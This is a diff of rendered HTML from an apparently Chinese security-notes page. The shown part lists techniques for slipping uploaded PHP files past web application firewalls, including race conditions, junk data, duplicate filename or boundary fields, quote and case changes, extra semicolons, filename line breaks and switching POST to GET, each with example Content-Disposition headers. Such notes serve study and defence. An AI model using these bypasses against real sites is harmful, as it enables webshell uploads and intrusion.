-<h5 id="其他" class="heading-element"><span>0.0.0.3  其他</span>
+<h1 id="其他" class="heading-element"><span>其他</span>
   <a href="#%e5%85%b6%e4%bb%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="条件竞争" class="heading-element"><span>0.0.0.3.1  条件竞争</span>
+</h1><h2 id="条件竞争" class="heading-element"><span>条件竞争</span>
   <a href="#%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>利用条件竞争删除文件时间差绕过。</li>
 <li>在脚本运行的时候，访问 Webshell</li>
 </ul>
-<h6 id="绕waf" class="heading-element"><span>0.0.0.3.2  绕WAF</span>
+<h2 id="绕waf" class="heading-element"><span>绕WAF</span>
   <a href="#%e7%bb%95waf" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>在恶意代码前加==垃圾数据==；</li>
 <li>在数据包前加垃圾数据；</li>
 <li>在Content-Disposition参数后面加垃圾数据；</li>
@@ -379,18 +429,30 @@ tomcat
 <li>文件名后缀处回车</li>
 <li>多个Content-Disposition</li>
 </ul>
-<p>####### 多个filename</p>
-<p>早期版本安全狗，可以多加一个filename</p>
+<h3 id="多个filename" class="heading-element"><span>多个filename</span>
+  <a href="#%e5%a4%9a%e4%b8%aafilename" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>早期版本安全狗，可以多加一个filename</p>
 <pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.txt&#34;; filename=&#34;test.php&#34;</code></pre><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
-<p>####### 交换name和filename的顺序</p>
-<p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
-<pre tabindex="0"><code>Content-Disposition: form-data; filename=&#34;xx.php&#34;; name=file_x</code></pre><p>####### 去掉引号,双引号变成单引号</p>
-<pre tabindex="0"><code>Content-Disposition: form-data; name=file_x; filename=&#34;xx.php&#34;
+<h3 id="交换name和filename的顺序" class="heading-element"><span>交换name和filename的顺序</span>
+  <a href="#%e4%ba%a4%e6%8d%a2name%e5%92%8cfilename%e7%9a%84%e9%a1%ba%e5%ba%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; filename=&#34;xx.php&#34;; name=file_x</code></pre><h3 id="去掉引号双引号变成单引号" class="heading-element"><span>去掉引号,双引号变成单引号</span>
+  <a href="#%e5%8e%bb%e6%8e%89%e5%bc%95%e5%8f%b7%e5%8f%8c%e5%bc%95%e5%8f%b7%e5%8f%98%e6%88%90%e5%8d%95%e5%bc%95%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><pre tabindex="0"><code>Content-Disposition: form-data; name=file_x; filename=&#34;xx.php&#34;
 Content-Disposition: form-data; name=file_x; filename=xx.php
 Content-Disposition: form-data; name=&#34;file_x&#34;; filename=xx.php
 Content-Disposition: form-data; name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><p>单引号、双引号、不要引号，都能上传。</p>
-<p>####### 大小写</p>
-<p>对这三个固定的字符串进行大小写转换</p>
+<h3 id="大小写" class="heading-element"><span>大小写</span>
+  <a href="#%e5%a4%a7%e5%b0%8f%e5%86%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>对这三个固定的字符串进行大小写转换</p>
 <ul>
 <li>
 <p>Content-Disposition</p>
@@ -400,31 +462,55 @@ Content-Disposition: form-data; name=&#39;file_x&#39;; filename=&#39;xx.php&#39;
 </li>
 <li>
 <p>filename</p>
+<h3 id="空格" class="heading-element"><span>空格</span>
+  <a href="#%e7%a9%ba%e6%a0%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>在: ; =添加1个或者多个空格。</p>
 </li>
 </ul>
-<p>####### 空格</p>
-<p>在: ; =添加1个或者多个空格。</p>
-<p>####### 去掉或修改Content-Disposition值</p>
-<p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p>
-<pre tabindex="0"><code>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><p>####### 多个boundary</p>
-<p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
+<h3 id="去掉或修改content-disposition值" class="heading-element"><span>去掉或修改Content-Disposition值</span>
+  <a href="#%e5%8e%bb%e6%8e%89%e6%88%96%e4%bf%ae%e6%94%b9content-disposition%e5%80%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p>
+<pre tabindex="0"><code>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><h3 id="多个boundary" class="heading-element"><span>多个boundary</span>
+  <a href="#%e5%a4%9a%e4%b8%aaboundary" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p>
 <pre tabindex="0"><code>------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.txt&#34;
 Content-Type: text/javascript
 
 ------WebKitFormBoundaryj1oRYFW91eaj8Ex2
 Content-Disposition: form-data; name=&#34;file_x&#34;; filename=&#34;test.php&#34;
-Content-Type: text/javascript</code></pre><p>####### 多个分号</p>
-<p>文件解析时，可能解析不到文件名，导致绕过。</p>
-<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;;;; filename=&#34;test.php&#34;</code></pre><p>####### Header在boundary前添加任意字符</p>
-<p>PHP支持，JAVA报错</p>
-<pre tabindex="0"><code>Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</code></pre><p>####### filename换行</p>
-<p>PHP支持，Java不支持</p>
+Content-Type: text/javascript</code></pre><h3 id="多个分号" class="heading-element"><span>多个分号</span>
+  <a href="#%e5%a4%9a%e4%b8%aa%e5%88%86%e5%8f%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;;;; filename=&#34;test.php&#34;</code></pre><h3 id="header在boundary前添加任意字符" class="heading-element"><span>Header在boundary前添加任意字符</span>
+  <a href="#header%e5%9c%a8boundary%e5%89%8d%e6%b7%bb%e5%8a%a0%e4%bb%bb%e6%84%8f%e5%ad%97%e7%ac%a6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>PHP支持，JAVA报错</p>
+<pre tabindex="0"><code>Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</code></pre><h3 id="filename换行" class="heading-element"><span>filename换行</span>
+  <a href="#filename%e6%8d%a2%e8%a1%8c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>PHP支持，Java不支持</p>
 <pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;file_x&#34;; file
-name=&#34;test.php&#34;</code></pre><p>####### name和filename添加任意字符串</p>
-<p>PHP支持，Java不支持</p>
-<pre tabindex="0"><code>Content-Disposition: name=&#34;file_x&#34;; bypass waf upload; filename=&#34;test.php&#34;;</code></pre><p>####### POST/GET</p>
-<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
+name=&#34;test.php&#34;</code></pre><h3 id="name和filename添加任意字符串" class="heading-element"><span>name和filename添加任意字符串</span>
+  <a href="#name%e5%92%8cfilename%e6%b7%bb%e5%8a%a0%e4%bb%bb%e6%84%8f%e5%ad%97%e7%ac%a6%e4%b8%b2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>PHP支持，Java不支持</p>
+<pre tabindex="0"><code>Content-Disposition: name=&#34;file_x&#34;; bypass waf upload; filename=&#34;test.php&#34;;</code></pre><h3 id="postget" class="heading-element"><span>POST/GET</span>
+  <a href="#postget" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。
 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p></div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
